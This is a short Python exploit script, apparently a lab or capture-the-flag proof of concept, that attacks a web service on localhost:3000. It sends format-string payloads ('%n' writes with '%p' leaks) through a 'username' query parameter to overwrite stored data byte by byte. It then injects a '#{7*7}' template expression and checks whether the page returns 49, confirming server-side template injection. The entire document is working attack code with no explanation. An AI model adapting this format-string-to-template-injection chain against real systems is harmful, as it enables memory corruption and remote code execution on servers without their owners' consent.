#!/usr/bin/env python3

import requests


URL = "http://localhost:3000"

PAYLOAD = "#{ 7*7 }"


def overwrite_regex(payload, steps):
    for i in range(0, len(payload), steps):
        requests.get(
            URL,
            params={
                "username": "A%" + str(65535 + i) + "c%2$n%p%p%p%p",
            },
        ).text

        requests.get(
            URL,
            params={
                "username": "B"
                * int.from_bytes(payload[i : i + steps].encode(), byteorder="little")
                + "%n%p|%p",
            },
        ).text


overwrite_regex("#{7*7}}", steps=1)
if "49" in requests.get(URL).text:
    print("SSTI with FS Write: success")
